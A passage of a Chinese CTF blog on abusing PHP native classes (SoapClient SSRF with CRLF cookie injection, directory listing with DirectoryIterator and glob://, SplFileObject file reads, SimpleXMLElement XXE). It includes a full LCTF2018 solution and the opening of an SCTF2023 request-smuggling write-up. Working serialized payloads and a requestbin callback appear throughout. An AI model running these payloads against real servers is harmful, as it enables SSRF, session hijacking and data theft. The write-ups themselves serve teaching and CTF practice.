class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://IP_ADDR:PORT/XXX&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://IP_ADDR:PORT&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>(); <span class="hljs-comment">//调用不存在的方法触发__call()进行SSRF</span><br></code></pre></td></tr></table></figure><p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>插入cookie示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://requestbin.net/r/doe3ps5d&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>例题</p><p><strong>bestphp’s revenge</strong></p><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125;<br></code></pre></td></tr></table></figure><p>使用dirsearch可扫出flag.php</p><p>内容如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">only localhost can <span class="hljs-built_in">get</span> flag!session_start();<br>echo <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>; <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>&#123; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>; &#125; <br>only localhost can <span class="hljs-built_in">get</span> flag!<br></code></pre></td></tr></table></figure><p>由<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>可以推测这里需要通过内网进行访问。由此可以推断出这里需要使用SSRF。</p><p>反观源码，有两个<code>call_user_func</code>可以使用可以调用任意函数。这里能想到的就是使用SoapClient类进行SSRF。但是要使用SoapClient进行SSRF的话需要反序列化触发SoapClient类里的<code>__call()</code>魔法函数。</p><p> 问题是题目里并没有直接给出反序列化接口，但是由题目里的<code>session_start()</code>可以联想到这里要利用<code>session()</code>进行反序列化。</p><p>先利用题目中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>写入序列化数据，再根据此处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>利用<code>call_user_func</code>的特性可以调用不存在的函数触发SSRF从而将flag写入session中。最后通过<code>var_dump($_SESSION);</code>输出flag。</p><p>这里第一步要先设置php的session序列化引擎</p><blockquote><p>但是如果想要利用session反序列化漏洞的话，我们必须要有 <code>ini_set()</code> 这个函数来更改 <code>session.serialize_handler</code> 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用<code>session_start()</code>函数来代替，即构造 session_start(serialize_handler&#x3D;php_serialize) 就行了。我们可以利用题目中的 <code>call_user_func($_GET[‘f’], $_POST);</code> 函数，传入<code>GET：/?f=session_start</code>、POST：<code>serialize_handler=php_serialize</code>，实现 session_start(serialize_handler&#x3D;php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。</p></blockquote><p>先把session中的PHPSESSID记录下来</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049498.png" alt="image-20230719150003390"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs module__htmlArea">n4caglsikk9fufk06mefhv4gv6<br></code></pre></td></tr></table></figure><p>修改反序列化引擎，把需要反序列化的数据写入session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&quot;s4mmy\r\nCookie: PHPSESSID=n4caglsikk9fufk06mefhv4gv6\r\n&quot;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&quot;123&quot;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>这里我踩的了个小坑，像<code>\r\n</code>这种转义字符在PHP中要放在双引号中才能生效，我之前写的时候放在单引号内无法生效。。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">|O<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>SoapClient<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>uri<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22123</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>location<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">25</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%2</span>Fflag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">15</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_stream_context<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_user_agent<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">53</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>s<span class="hljs-number">4</span>mmy<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ACookie<span class="hljs-variable">%3</span>A+PHPSESSID<span class="hljs-variable">%3</span>Dn<span class="hljs-number">4</span>caglsikk<span class="hljs-number">9</span>fufk<span class="hljs-number">06</span>mefhv<span class="hljs-number">4</span>gv<span class="hljs-number">6</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>_soap_version<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>（不要忘记序列化数据区前面的竖杠）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049671.png" alt="image-20230719150147210"></p><p>接着只要刷新页面就能反序列化数据。但是还需以一步是触发<code>__call</code>方法。这里利用的是<code>call_user_func</code>的一个特性。当传入<code>call_user_func</code>的参数是一个数组时，可以用<code>call_user_func()</code>来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名，所以就会调用<code>welcome_to_the_lctf2018</code>这个不存在的方法完成反序列化。至于<code>$b</code>就是用<code>extarct</code>函数进行变量覆盖。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">f</span>=extract<br><br>POST<br><span class="hljs-attribute">b</span>=call_user_func<br></code></pre></td></tr></table></figure><p>执行完成后只要带上之前保存的Cookie去访问页面就能获得flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049224.png" alt="image-20230719150301629"></p><p>这里我在一开始做题时又反了毛病，就是写序列化数据在session处忘了带上了PHPSESSID</p><h3 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h3><p>Directorylterator类属于PHP的原生文件操作类</p><p>Directorylterator类提供了一个查看文件系统目录的简单接口，是PHP5的一个新增类。</p><p><strong>Directorylterator与glob:&#x2F;&#x2F;协议结合可以无视open_basedir对目录的限制</strong>，可以用来列举出指定目录下的文件。</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-comment">//如果想输出全部的文件名我们还需要对$dir对象进行遍历</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-comment">//如果想输出全部的文件名我们还需要对$dir对象进行遍历</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?w</span>hoami=<span class="hljs-symbol">glob:</span>/<span class="hljs-regexp">//</span>*<br></code></pre></td></tr></table></figure><p>可以看到访问了phpstudy所在盘下根目录所有文件</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049096.png" alt="image-20230719162032861"></p><blockquote><p>但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p></blockquote><p>glob协议适用通配符查询</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049258.png" alt="image-20230719162433774"></p><p>其他文件操作类</p><p>FilesystemIterator 类<br>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    <span class="hljs-comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*php*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><p>GlobIterator 类</p><p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob:&#x2F;&#x2F;协议了。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">代码：<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-comment">// 不加__toString()也可,因为echo可以自动调用</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># payload一句话的形式:</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><h4 id="可读取文件内容类"><a href="#可读取文件内容类" class="headerlink" title="可读取文件内容类"></a>可读取文件内容类</h4><p>plFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p><p>我们可以像类似下面这样去读取一个文件的一行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/cachegrind.out.1004&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br></code></pre></td></tr></table></figure><p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/cachegrind.out.1004&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SimpleXMLElement类"><a href="#SimpleXMLElement类" class="headerlink" title="SimpleXMLElement类"></a>SimpleXMLElement类</h3><p>SimpleXMLElement这个内置类用于解析XML文档中的元素</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">SimpleXMLElement</span>::<span class="hljs-title function_ invoke__">__construct</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$dataIsURL</span> = <span class="hljs-literal">false</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$namespaceOrPrefix</span> = <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$isPrefix</span> = <span class="hljs-literal">false</span><br>)<br></code></pre></td></tr></table></figure><p><img src="/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8.assets/20210329180252-eccb96c2-9075-1.png"></p><p>这里比较重要的是第三个参数，如果<code>data_is_url</code>设置为<code>true</code>那么可以实现远程xml文件的载入。第二个参数一般设置为2。第一个参数data可以设置为payliad的url地址用于进入外部实体url。或者xml文档字符串也可以。</p><p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h3 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h3><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049636.png" alt="image-20230725004824174"></p><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SCTF2023</title>
    <link href="/2023/07/23/SCTF2023/SCTF2023/"/>
    <url>/2023/07/23/SCTF2023/SCTF2023/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="SCTF2023"><a href="#SCTF2023" class="headerlink" title="SCTF2023"></a>SCTF2023</h1><p>太难了，一题能卡我一天😭😭😭，对于一些东西的理解还是太浅了。题目做起来都好吃力。</p><h3 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h3><p>这题的考点是请求走私</p><p>首先是代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$FLAG</span> = <span class="hljs-string">&quot;flag&#123;fake_flag&#125;&quot;</span>;<br>@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-variable">$FLAG</span>);<br><span class="hljs-comment"># but it&#x27;s not the real flag</span><br><span class="hljs-comment"># beacuse someone say this year is not 2023 !!! like the post?</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;./2023.php&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./post.jpeg&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;data:image/jpeg;base64,&#x27;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;<br><span class="hljs-comment"># notice -&gt; time</span><br><span class="hljs-comment"># How should you get to where the flag is, the middleware will not forward requests that are not 2023</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先是<code>file_get_contents</code>，这个函数可以把文件读入一个字符串。</p><p>它的第一个参数，同时也是必须参数是<code>path</code>这个path可以是本地文件路径也可以是网络地址。<code>file_get_contents</code>函数在设计上把一切的网络资源视作文件，无论本地，或者远程服务器的。然而在大多数PHP教程网站并没有说明这一点，让我以为只能其只能读取本地文件。</p><p>也就是说，<strong>我们可以通过其来请求一个网络地址，变抓取返回包。</strong>这是一个很关键的点，可惜我做的时候只是简单的理解为只能读本地文件，导致我看WP的时候都卡了好久😭也无法理解<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>这一句话的真正含义。</p><p>接着下面的代码就是简单地展示了这张图片</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231952692.png"></p><p>根据图片提示，我们应该是要访问2022文件，但是直接访问不行。提示也给了说中间件会拦截请求，Wappalyzer可以看到该站是apache 2.4.54，直接搜索漏洞可得CVE-2023-25690<a href="https://xz.aliyun.com/t/12345">请求走私漏洞</a></p><p>简单来说就是apache在处理的时候会将URI后面的一部分解码解析后直接拼接到请求包中再传递给后端服务器。因为控制字符也会直接解析，所以有机会进行CRLF注入，从而进行请求走私。</p><p>再看一下题目中的<code>file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG)</code>，参数url使GET方式获取值同时在请求的时候会带上FLAG变量，但是在2023.php中的flag是一个fake flag</p><p>所以首先构造一个请求包去访问2022.php文件，但是直接访问的话是没有回显的。这里就要利用到<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>因为在2023.php中的<code>file_get_contents();</code>并无实际作用，所以可以推测在2022.php中也存在着一个<code>file_get_contents()</code>所以在请求走私的时候，给url传值为我们自己的VPS地址，同时在VPS上使用nc开启端口监听，就能捕捉到<code>file_get_contents()</code>的请求包同时得到flag</p><blockquote><p>CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。</p></blockquote><p>构造如下payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span 